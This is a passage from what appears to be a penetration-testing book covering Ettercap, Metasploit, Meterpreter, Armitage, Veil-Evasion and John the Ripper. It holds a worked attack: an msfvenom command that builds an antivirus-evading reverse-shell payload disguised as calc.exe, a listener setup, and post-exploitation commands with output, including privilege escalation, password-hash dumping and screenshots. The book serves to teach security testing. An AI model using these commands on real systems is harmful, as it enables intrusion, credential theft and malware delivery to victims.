</pre></div><p class="calibre27">Here:</p><div class="book"><ul class="itemizedlist1"><li class="listitem"><code class="literal">--text</code>: This is the text mode user interface</li><li class="listitem"><code class="literal">--iface eth0</code>: This is the used network interface</li><li class="listitem"><code class="literal">--write traffic.pcap</code>: This is the dump of network traffic in PCAP file format (or you can use <code class="literal">-L log.txt</code> to log in Ettercap format)</li><li class="listitem"><code class="literal">--mitm arp:remote</code>: This is the MitM attack and its type</li><li class="listitem"><code class="literal">/172.16.0.91/ /172.16.0.102/</code>: Targets of the attack</li></ul></div><p class="calibre27">We can <a id="id439" class="calibre1"/>see the intercepted HTTP traffic along with the login and password:</p><div class="mediaobject"><img src="../images/00061.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li></ol><div class="calibre14"/></div><div class="informalexample" title="Note"><h3 class="title2"><a id="note210" class="calibre1"/>Note</h3><p class="calibre9">If you want to learn more about Ettercap (and we believe you might, because it is a great tool) we recommend you, as always, read the official documentation and pay additional attention to the "etterfilters" functionality that significantly extends the power and abilities of Ettercap. You can get both descriptions of Ettercap and its etterfilters using the <code class="literal">man</code> commands:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">man ettercap</strong></span>
<span class="strong"><strong class="calibre2">man etterfilter</strong></span>
</pre></div></div></div></div></div>

<div class="book" title="Infrastructure hacking tools">
<div class="book" title="Metasploit Framework"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_3"><a id="ch06lvl2sec63" class="calibre1"/>Metasploit Framework</h2></div></div></div><p class="calibre9">Metasploit is a <a id="id440" class="calibre1"/>great penetration testing tool that consists of hundreds of modules and exploits and allowing users to quickly write and integrate their own modules and extensions.</p><p class="calibre9">Through<a id="id441" class="calibre1"/> written code (mainly in Ruby), Metasploit is cross-platform, that is, it has no specific reference to any OS.</p><p class="calibre9">Metasploit can be downloaded from the official website <a class="calibre1" href="http://www.metasploit.com">http://www.metasploit.com</a> and from the GitHub <a id="id442" class="calibre1"/>repository at <a class="calibre1" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a>.</p><p class="calibre9">You can download various <a id="id443" class="calibre1"/>versions of Metasploit:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong class="calibre2">Metasploit Framework</strong></span>: This<a id="id444" class="calibre1"/> is for users of the Metasploit Framework command-line tools only</li><li class="listitem"><span class="strong"><strong class="calibre2">Metasploit Community</strong></span>: This <a id="id445" class="calibre1"/>is a limited-feature, community edition for students and small businesses</li><li class="listitem"><span class="strong"><strong class="calibre2">Metasploit Pro</strong></span>: This<a id="id446" class="calibre1"/> is the commercial edition for penetration testers and security professionals</li></ul></div><p class="calibre9">In our case, we will consider only the Framework version because it is fully functional and free. The functionality modules are<a id="id447" class="calibre1"/> divided into five categories:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong class="calibre2">Auxiliary</strong></span>: This <a id="id448" class="calibre1"/>category contains tools for performing support of exploitation processes. It contains discovery modules, information gathering modules, scanners, servers, and many more.</li><li class="listitem"><span class="strong"><strong class="calibre2">Exploits</strong></span>: This<a id="id449" class="calibre1"/> category contains modules for exploiting vulnerabilities. The exploits category divided on several platform subcategories, such as Windows, Linux, Solaris, OS X, and so on.</li><li class="listitem"><span class="strong"><strong class="calibre2">Payloads</strong></span>: This <a id="id450" class="calibre1"/>category contains various types of payload, which can be used with exploits.</li><li class="listitem"><span class="strong"><strong class="calibre2">Encoders</strong></span>: This <a id="id451" class="calibre1"/>category contains tools to encode exploits and payloads to bypass security mechanisms of the target system.</li><li class="listitem"><span class="strong"><strong class="calibre2">Post</strong></span>: This <a id="id452" class="calibre1"/>category contains post-exploitation tools, which can be used when network connection with a target host is established, such as escalation of privilege, information gathering on remote hosts, and others.</li></ul></div><p class="calibre9">Metasploit has several <a id="id453" class="calibre1"/>main user interfaces:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Shell (<code class="literal">msfconsole</code>)</li><li class="listitem">Web interface (available in Community and Pro versions)</li><li class="listitem">Third-party GUI (Armitage and more advanced Cobalt strike)</li></ul></div><p class="calibre9">But the basic functionality of the Framework is implemented via the following executable files:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">msfrpc</code>: This is <a id="id454" class="calibre1"/>used for remote server implementation (based on remote procedure calling)</li><li class="listitem"><code class="literal">msfconsole</code>: This <a id="id455" class="calibre1"/>is the main utility for interaction with Metasploit via the console command line</li><li class="listitem"><code class="literal">msfd</code>: This<a id="id456" class="calibre1"/> utility allows spawning of an instance of msfconsole and allows remote users to connect to and use it</li><li class="listitem"><code class="literal">msfupdate</code>: This <a id="id457" class="calibre1"/>is an update utility</li><li class="listitem"><code class="literal">msfvenom</code>: This <a id="id458" class="calibre1"/>utility is used for creation of payloads</li></ul></div><p class="calibre9">The<a id="id459" class="calibre1"/> standard user interface is an interactive console command line, which can be run by executing the <code class="literal">msfconsole</code> command. In this interface, the user can feel the power of Metasploit.</p><p class="calibre9">Working with the Metasploit Framework consists of the following key steps:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">Information gathering and vulnerability conditions identification (auxiliary modules).</li><li class="listitem" value="2">Selecting and configuring an exploit for remote target object.</li><li class="listitem" value="3">Selecting and configuring the payload that will be used.</li><li class="listitem" value="4">Selecting and configuring the encoding that will be used to bypass security mechanisms (such as Intrusion Detection System).</li><li class="listitem" value="5">Exploiting remote systems.</li><li class="listitem" value="6">Maintaining access.</li><li class="listitem" value="7">Post-exploitation actions (post modules).</li></ol><div class="calibre14"/></div><p class="calibre9">Metasploit is easy to use. It was created with the purpose to assist and facilitate the work of penetration testing specialists.</p><p class="calibre9">The following are the most popular commands:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">use</code>: This<a id="id460" class="calibre1"/> is used to select a module.</li><li class="listitem"><code class="literal">search</code>: This <a id="id461" class="calibre1"/>command is used for searching modules.</li><li class="listitem"><code class="literal">show options</code>: These<a id="id462" class="calibre1"/> are used to view the settings of the module to configure. After selecting an exploit, you can see what options are available for customization.</li><li class="listitem"><code class="literal">show payloads</code>: Metasploit <a id="id463" class="calibre1"/>comprises a lot of payloads. This command shows all the available payloads. By using this command, you can also see the recommended payloads for a particular operating system or exploit.</li><li class="listitem"><code class="literal">info</code>: This<a id="id464" class="calibre1"/> is used to view information about the module.</li><li class="listitem"><code class="literal">set</code>: This<a id="id465" class="calibre1"/> command sets the parameters, for example, RHOST (remote), LHOST (local), or payload for exploit.</li><li class="listitem"><code class="literal">exploit</code>: This<a id="id466" class="calibre1"/> is used for module execution.</li></ul></div><div class="informalexample" title="Note"><h3 class="title2"><a id="note26" class="calibre1"/>Note</h3><p class="calibre9">Metasploit Framework is really a very convenient way to show someone's vulnerabilities, but unfortunately it is not possible to describe all the capabilities of Metasploit in one short review topic and it is beyond the scope of our book. If you decide to use Metasploit in your own work, we strongly recommend that you read the following books:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><em class="calibre10">Metasploit Unleashed</em></span> by Offensive Security (<a class="calibre1" href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a>)</li><li class="listitem"><span class="strong"><em class="calibre10">Metasploit Penetration Testing Cookbook</em></span> by Abhinav Singh (<a class="calibre1" href="https://www.packtpub.com/networking-and-servers/metasploit-penetration-testing-cookbook">https://www.packtpub.com/networking-and-servers/metasploit-penetration-testing-cookbook</a>)</li><li class="listitem"><span class="strong"><em class="calibre10">Mastering Metasploit</em></span> by Nipun Jaswal (<a class="calibre1" href="https://www.packtpub.com/networking-and-servers/mastering-metasploit">https://www.packtpub.com/networking-and-servers/mastering-metasploit</a>)</li><li class="listitem"><span class="strong"><em class="calibre10">Learning Metasploit Exploitation and Development</em></span> by Aditya Balapure (<a class="calibre1" href="https://www.packtpub.com/networking-and-servers/learning-metasploit-exploitation-and-development">https://www.packtpub.com/networking-and-servers/learning-metasploit-exploitation-and-development</a>)</li></ul></div></div><div class="book" title="Meterpreter"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec43" class="calibre1"/>Meterpreter</h3></div></div></div><p class="calibre9">Meterpreter (<a class="calibre1" href="https://github.com/rapid7/meterpreter">https://github.com/rapid7/meterpreter</a>) is a <a id="id467" class="calibre1"/>part of Metasploit and one of <a id="id468" class="calibre1"/>the most popular payloads in <a id="id469" class="calibre1"/>Metasploit. In the context of Metasploit, Meterpreter is a flexible, scalable, full-featured, and unified basis for post-exploitation, as an alternative to the classic shellcode. It has a lot of features: shell, migration processes, encryption to bypass intrusion detection systems, antivirus, DLL injection, pivoting, and automation possibilities.</p><p class="calibre9">By the way, we <a id="id470" class="calibre1"/>can also use <code class="literal">metsvc</code> as the payload, which will install Meterpreter on a remote system as a service of the operating system on a remote Windows host (like a backdoor).</p><p class="calibre9">After successful <a id="id471" class="calibre1"/>exploitation of the vulnerability on a remote host and loading the payload (Meterpreter in our case) in the interactive console of Metasploit, we obtain the full-featured console command line of Meterpreter and we can execute the command. All commands of Meterpreter can be divided into different categories (you can get this information by executing the <code class="literal">help</code> command):</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong class="calibre2">Core commands</strong></span>: These<a id="id472" class="calibre1"/> are basic commands for Meterpreter session management</li><li class="listitem"><span class="strong"><strong class="calibre2">Stdapi—filesystem commands</strong></span>: These <a id="id473" class="calibre1"/>are commands for moving on remote filesystems, file manipulation commands, download and upload file commands, and so on</li><li class="listitem"><span class="strong"><strong class="calibre2">Stdapi—networking commands</strong></span>: These<a id="id474" class="calibre1"/> are commands for displaying information about network components, viewing and modifying the routing table, and managing forwarding a local port to a remote</li><li class="listitem"><span class="strong"><strong class="calibre2">Stdapi—system commands</strong></span>: These<a id="id475" class="calibre1"/> commands are useful for manipulating a remote system and processes of that system</li></ul></div><p class="calibre9">We will not describe all commands of Meterpreter now, because it would require many pages of text. It is better to show a real-world example of how it works.</p></div><div class="book" title="Example"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec44" class="calibre1"/>Example</h3></div></div></div><p class="calibre9">As an example<a id="id476" class="calibre1"/> of Metasploit usage, we consider the case when Meterpreter is packed into an executable file that is executed at a Windows workstation of an incautious user. As a result, Meterpreter establishes a connection to a predefined IP address (the attacker's machine) that allows an attacker to execute commands at the victim's workstation:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">First of all, let's create our payload. For this, we should execute the following command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.191 lport=8888 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -x calc.exe -f exe-only &gt; payload_fake_calc_enc.exe</strong></span>
</pre></div><p class="calibre27">Here:</p><div class="book"><ul class="itemizedlist1"><li class="listitem">-<code class="literal">p windows/meterpreter/reverse_tcp</code>: This specifies the payload we are going to use (for a full list of supported payloads, just execute the command <code class="literal">msfvenom –l payloads</code>)</li><li class="listitem"><code class="literal">lhost=10.0.0.191</code>: This specifies the address of the attacker's host to connect back to</li><li class="listitem"><code class="literal">lport=8888</code>: This specifies the port number for connecting back</li><li class="listitem"><code class="literal">-a x86</code>: This specifies the architecture of the target system</li><li class="listitem"><code class="literal">--platform win</code>: This specifies the platform of the target system</li><li class="listitem"><code class="literal">-e x86/shikata_ga_nai</code>: This specifies the encoding algorithm to be applied to our payload in order to try to avoid detection by an antivirus software</li><li class="listitem">-<code class="literal">i 3</code>: This specifies the required number of encoding iterations</li><li class="listitem"><code class="literal">-x calc.exe</code>: This specifies a custom executable file to use as a template</li><li class="listitem"><code class="literal">-f exe-only</code>: This specifies the output format</li><li class="listitem"><code class="literal">payload_fake_calc_enc.exe</code>: This is the output filename of our generated malicious executable</li></ul></div></li><li class="listitem" value="2">The <a id="id477" class="calibre1"/>output of this command should look like this:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Found 1 compatible encoders</strong></span>
<span class="strong"><strong class="calibre2">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</strong></span>
<span class="strong"><strong class="calibre2">x86/shikata_ga_nai succeeded with size 360 (iteration=0)</strong></span>
<span class="strong"><strong class="calibre2">x86/shikata_ga_nai succeeded with size 387 (iteration=1)</strong></span>
<span class="strong"><strong class="calibre2">x86/shikata_ga_nai succeeded with size 414 (iteration=2)</strong></span>
<span class="strong"><strong class="calibre2">x86/shikata_ga_nai chosen with final size 414</strong></span>
<span class="strong"><strong class="calibre2">Payload size: 414 bytes</strong></span>
</pre></div></li><li class="listitem" value="3">Now we have the <code class="literal">payload_fake_calc_enc.exe</code> file and we need to get this file to the victim host. You can just copy it there and assume that a victim/user has downloaded it from the Internet.</li><li class="listitem" value="4">Now, we need to start listening for incoming connections at the attacker's machine. To do this, run Metasploit Framework on the attacker's machine by executing in console command <code class="literal">msfconsole</code>. After few seconds, Metasploit will be loaded, started, and invite us to command prompt.</li><li class="listitem" value="5">To start listening, let's choose the necessary module:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">msf &gt; use exploit/multi/handler </strong></span>
</pre></div><p class="calibre27">Set the payload type for which connections to await:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpand </strong></span>
</pre></div><p class="calibre27">We should see the following confirmation:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</strong></span>
</pre></div></li><li class="listitem" value="6">After<a id="id478" class="calibre1"/> that, we need to set a few options required by this certain payload (local address and port for listening):<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">msf exploit(handler) &gt; set LHOST 10.0.0.191</strong></span>
<span class="strong"><strong class="calibre2">msf exploit(handler) &gt; set LPORT 8888</strong></span>
</pre></div><p class="calibre27">Metasploit will confirm that both options are set:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">LHOST =&gt; 10.0.0.191</strong></span>
<span class="strong"><strong class="calibre2">LPORT =&gt; 8888</strong></span>
</pre></div></li><li class="listitem" value="7">To start listening, we need to execute the <code class="literal">exploit</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">msf exploit(handler) &gt; exploit -j</strong></span>
</pre></div><p class="calibre27">If everything went well, we should see the following output:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">[*] Exploit running as background job.</strong></span>
<span class="strong"><strong class="calibre2">[*] Started reverse handler on 10.0.0.191:8888 </strong></span>
<span class="strong"><strong class="calibre2">[*] Starting the payload handler...</strong></span>
</pre></div></li><li class="listitem" value="8">So, everything is set up and ready for an attack. Let's execute our generated malicious file <code class="literal">payload_fake_calc_enc.exe</code> on the victim host. In the console of Metasploit, we will see something like this:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">[*] Meterpreter session 1 opened (10.0.0.191:8888 -&gt; 10.0.0.163:49166) at 2015-12-18 00:14:46 +0300</strong></span>
</pre></div></li><li class="listitem" value="9">To start interacting with the Meterpreter session, we need to execute the following command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">msf exploit(handler) &gt; sessions -i 3</strong></span>
</pre></div></li><li class="listitem" value="10">After that, we will find ourselves in an interactive console of Meterpreter session. Now, we can execute commands inside our session, which will be executed on the remote victim host. For example, we need to execute the command <code class="literal">getuid</code> to see which user environment started our session and to get the identifier of our current process, we can use the <code class="literal">getpid</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; getuid</strong></span>
<span class="strong"><strong class="calibre2">meterpreter &gt; getpid</strong></span>
</pre></div><p class="calibre27">These commands produce the following output:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Server username: WS1\John</strong></span>

<span class="strong"><strong class="calibre2">Current pid: 2648</strong></span>
</pre></div></li><li class="listitem" value="11">To <a id="id479" class="calibre1"/>escalate privilege, we can use the <code class="literal">getsystem</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; getsystem</strong></span>
</pre></div><p class="calibre27">This command produces the following output:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</strong></span>
</pre></div><p class="calibre27">And then check the result with the <code class="literal">getuid</code> command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; getuid</strong></span>
</pre></div><p class="calibre27">Now we have system privileges which we can see from the command's output:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Server username: NT AUTHORITY\SYSTEM</strong></span>
</pre></div></li><li class="listitem" value="12">To list all processes running on the remote system, we can use the <code class="literal">ps</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; ps</strong></span>
</pre></div><p class="calibre27">The output lists all running processes along with their identifiers and the other useful information</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Process List</strong></span>
<span class="strong"><strong class="calibre2">============</strong></span>
<span class="strong"><strong class="calibre2">PID   PPID  Name                 Arch  Session  User                          Path</strong></span>
<span class="strong"><strong class="calibre2">0     0     [System Process]                                                  </strong></span>
<span class="strong"><strong class="calibre2">4     0     System               x64   0                                      </strong></span>
<span class="strong"><strong class="calibre2"> 12   4     smss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</strong></span>
<span class="strong"><strong class="calibre2">384   376   csrss.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</strong></span>
<span class="strong"><strong class="calibre2">400   816   audiodg.exe          x64   0                                      </strong></span>
<span class="strong"><strong class="calibre2">432   376   wininit.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</strong></span>
<span class="strong"><strong class="calibre2">440   424   csrss.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</strong></span>
<span class="strong"><strong class="calibre2">468   424   winlogon.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</strong></span>

<span class="strong"><strong class="calibre2">…</strong></span>

<span class="strong"><strong class="calibre2">2648  2204  payload1.exe         x86   1        WS1\John                      C:\Share\payload1.exe</strong></span>
<span class="strong"><strong class="calibre2">2920  1008  WMIADAP.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WMIADAP.exe</strong></span>
</pre></div></li><li class="listitem" value="13">We <a id="id480" class="calibre1"/>can also migrate to another process to avoid losing the connection of our malicious process. We can do it with the <code class="literal">migrate</code> command, specifying the target process identifier:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; migrate 716</strong></span>
</pre></div><p class="calibre27">The output is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">[*] Migrating from 2648 to 716...</strong></span>
<span class="strong"><strong class="calibre2">[*] Migration completed successfully.</strong></span>
</pre></div></li><li class="listitem" value="14">Meterpreter can also obtain hashes of the local user passwords on a hacked machine with the <code class="literal">hashdump</code> command (to successfully execute this command, we need to obtain system privileges before):<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; hashdump</strong></span>
</pre></div><p class="calibre27">The output is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</strong></span>
<span class="strong"><strong class="calibre2">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</strong></span>
<span class="strong"><strong class="calibre2">HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:04e8fedb35bde404593d20c030663d94:::</strong></span>
<span class="strong"><strong class="calibre2">John:1001:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::</strong></span>
</pre></div></li><li class="listitem" value="15">Meterpreter has a variety of functionalities and we can even take a screenshot of a victim's desktop session with the <code class="literal">screenshot</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; screenshot </strong></span>
</pre></div><p class="calibre27">When executed successfully, it reports the path where the screenshot was saved</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Screenshot saved to: /root/elzpOBoE.jpeg</strong></span>
</pre></div></li><li class="listitem" value="16">To terminate a session when you are done with the victim, execute the <code class="literal">exit</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">meterpreter &gt; exit</strong></span>
</pre></div><p class="calibre27">The output is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">[*] Shutting down Meterpreter...</strong></span>
<span class="strong"><strong class="calibre2">[*] 10.0.0.163 - Meterpreter session 1 closed.  Reason: User exit</strong></span>
</pre></div></li></ol><div class="calibre14"/></div></div><div class="book" title="Armitage"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec45" class="calibre1"/>Armitage</h3></div></div></div><p class="calibre9">It is <a id="id481" class="calibre1"/>necessary to mention the graphical interface for the Metasploit Framework, which is called <a id="id482" class="calibre1"/><span class="strong"><strong class="calibre2">Armitage</strong></span>. It is a graphical interface for Metasploit Framework to simplify working with it. Armitage represents host targets in the visual mode and it also gives tips and recommendations for exploits in each case. For advanced users, Armitage offers remote management and cooperation with Metasploit sessions.</p><p class="calibre9">Although Armitage is a graphical user interface that is mostly managed by a mouse, you cannot work completely without using the console. Thus, you have to learn how to use console commands anyway.</p><p class="calibre9">Download the installation archive from the official website <a class="calibre1" href="http://www.fastandeasyhacking.com/">http://www.fastandeasyhacking.com/</a>.</p><p class="calibre9">After installation, start Armitage by running the Armitage executable file:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">java -jar armitage.jar</strong></span>
</pre></div><p class="calibre9">After that, you will get the screen of Armitage:</p><div class="mediaobject"><img src="../images/00062.jpeg" alt="Armitage" class="calibre11"/></div><p class="calibre12"> </p><p class="calibre9">The <a id="id483" class="calibre1"/>program's interface is simple enough to<a id="id484" class="calibre1"/> understand, and it does not pose any difficulty if you know how Metasploit Framework works.</p></div><div class="book" title="Veil-Evasion framework"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec46" class="calibre1"/>Veil-Evasion framework</h3></div></div></div><p class="calibre9">Any <a id="id485" class="calibre1"/>defense system can be cheated and<a id="id486" class="calibre1"/> this applies to anti-virus too. It is a question of time needed to bypass the defense. In this case, a tool that automates the process of creating an encrypted payload is very useful. The most popular tool for this purpose is Veil-Evasion framework. It works as an add-on to Metasploit that has a wide range of functionality and is easy to use. Its only drawback is that it is "from the box" and supported only in the Kali Linux operating system environment.</p><p class="calibre9">The most obvious features<a id="id487" class="calibre1"/> are as follows:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Modularity of framework</li><li class="listitem">All generated <code class="literal">msfvenom</code> payloads for Windows can be integrated into the Framework</li><li class="listitem">Menu interface has been designed according to the principles of usability</li><li class="listitem">Autocompletion and autosubstitution</li><li class="listitem">Almost all options have been well documented (<code class="literal">./Veil.py -h</code>)</li></ul></div><p class="calibre9">After successful <a id="id488" class="calibre1"/>installation of Framework on your workstation, you can execute it with a simple command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">python Veil-Evasion.py</strong></span>
</pre></div><p class="calibre9">After that, you are welcomed by the Veil-Evasion framework main menu:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Veil-Evasion | [Version]: 2.21.4</strong></span>
<span class="strong"><strong class="calibre2">===============================================================</strong></span>
<span class="strong"><strong class="calibre2"> [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</strong></span>
<span class="strong"><strong class="calibre2">===============================================================</strong></span>
<span class="strong"><strong class="calibre2"> Main Menu</strong></span>
<span class="strong"><strong class="calibre2">    46 payloads loaded</strong></span>

<span class="strong"><strong class="calibre2">Available Commands:</strong></span>

<span class="strong"><strong class="calibre2">    use            Use a specific payload</strong></span>
<span class="strong"><strong class="calibre2">    info           Information on a specific payload</strong></span>
<span class="strong"><strong class="calibre2">    list             List available payloads</strong></span>
<span class="strong"><strong class="calibre2">    update      Update Veil-Evasion to the latest version</strong></span>
<span class="strong"><strong class="calibre2">    clean         Clean out payload folders</strong></span>
<span class="strong"><strong class="calibre2">    checkvt     Check payload hashes vs. VirusTotal</strong></span>
<span class="strong"><strong class="calibre2">    exit            Exit Veil-Evasion</strong></span>

<span class="strong"><strong class="calibre2"> [menu&gt;&gt;]:</strong></span>
</pre></div><p class="calibre9">To create an <a id="id489" class="calibre1"/>encrypted payload, you should perform the following actions:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">Enter the <code class="literal">use</code> command.</li><li class="listitem" value="2">From the list that appears, select the payload index that you want to generate.</li><li class="listitem" value="3">Next, you should set the required options with the <code class="literal">set</code> command. After all the options are set, input the <code class="literal">generate</code> command.</li><li class="listitem" value="4">Next, you need to choose which shellcode will be used:<div class="book"><ul class="itemizedlist1"><li class="listitem"><code class="literal">msfvenom</code> (default)</li><li class="listitem">Custom shellcode string</li><li class="listitem">File with shellcode (raw)</li></ul></div></li><li class="listitem" value="5">If you choose <code class="literal">msfvenom</code>, it will ask you about which payload to use (for example, Meterpreter) and the options while generating shellcode.</li><li class="listitem" value="6">Finally, Framework will ask you about the name of the output file that will be generated.</li></ol><div class="calibre14"/></div><p class="calibre9">At the end, Veil-Evasion framework<a id="id490" class="calibre1"/> shows the summary information about the generated payload:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Veil-Evasion | [Version]: 2.21.4</strong></span>
<span class="strong"><strong class="calibre2">=============================================================== [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</strong></span>
<span class="strong"><strong class="calibre2">===============================================================</strong></span>

<span class="strong"><strong class="calibre2"> [*] Executable written to: /usr/share/veil-output/compiled/payload1.exe</strong></span>

<span class="strong"><strong class="calibre2"> Language:    python</strong></span>
<span class="strong"><strong class="calibre2"> Payload:     python/shellcode_inject/aes_encrypt</strong></span>
<span class="strong"><strong class="calibre2"> Shellcode:   windows/meterpreter/reverse_tcp</strong></span>
<span class="strong"><strong class="calibre2"> Options:     LHOST=10.0.0.169  LPORT=8080</strong></span>
<span class="strong"><strong class="calibre2"> Required Options:      COMPILE_TO_EXE=Y  EXPIRE_PAYLOAD=X</strong></span>
<span class="strong"><strong class="calibre2">                        INJECT_METHOD=Virtual  USE_PYHERION=N</strong></span>
<span class="strong"><strong class="calibre2"> Payload File:    /usr/share/veil-output/source/payload1.py</strong></span>
<span class="strong"><strong class="calibre2"> Handler File:    /usr/share/veil-output/handlers/payload1_handler.rc</strong></span>

<span class="strong"><strong class="calibre2"> [*] Your payload files have been generated, don't get caught!</strong></span>
<span class="strong"><strong class="calibre2"> [!] And don't submit samples to any online scanner! ;)</strong></span>

<span class="strong"><strong class="calibre2"> [&gt;] Press any key to return to the main menu.</strong></span>
</pre></div><p class="calibre9">This concludes our review of the Veil-Evasion framework. In the end, we suggest you to try it in action.</p></div></div></div>

<div id="page" style="height:0pt"/><div class="book" title="Cracking tools"><div class="book" id="19UOO2-3ecab517ca6e4afbb3c20ab15f7b4d82"><div class="book"><div class="book"><h1 class="title" id="calibre_pb_0"><a id="ch06lvl1sec37" class="calibre1"/>Cracking tools</h1></div></div></div><p class="calibre9">Today, hashing is<a id="id491" class="calibre1"/> a basic security mechanism of most IT services. Overall, hashing transforms data of arbitrary length into the output bit string of a fixed length in a non-recoverable way (that is why it also called a one-way conversion). Hashes are often used for authentication purposes (to store and compare hashes of user passwords instead of storing passwords in clear text what is insecure), for integrity control (checksums).</p><p class="calibre9">Nowadays, we cannot imagine technologies that do not use encryption. Therefore, the question of the restoration of hashed data is one of the most important in today's IT security world. In this section, we will look at some of the popular tools that can be useful in performing this security analysis.</p></div>

<div class="book" title="Cracking tools">
<div class="book" title="John The Ripper"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_1"><a id="ch06lvl2sec64" class="calibre1"/>John The Ripper</h2></div></div></div><p class="calibre9">
<span class="strong"><strong class="calibre2">John The Ripper</strong></span> (<span class="strong"><strong class="calibre2">JTR</strong></span>) is<a id="id492" class="calibre1"/> a free program designed to recover <a id="id493" class="calibre1"/>passwords from their hashes. The main purpose of the program is to audit weak passwords on Unix systems. The program can also perform an audit of NTLM hashes (Microsoft Windows), Kerberos, and others. There are a variety of implementations of JTR for different operating systems. JTR is popular because it supports a lot of hash types. Several additional types of hashes are available with the additional updates.</p><p class="calibre9">The latest version of <a id="id494" class="calibre1"/>JTR is available on the official website <a class="calibre1" href="http://www.openwall.com/john">http://www.openwall.com/john</a>.</p><p class="calibre9">Installation in Debian or Ubuntu Linux can be performed by the standard method:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">apt-get install john</strong></span>
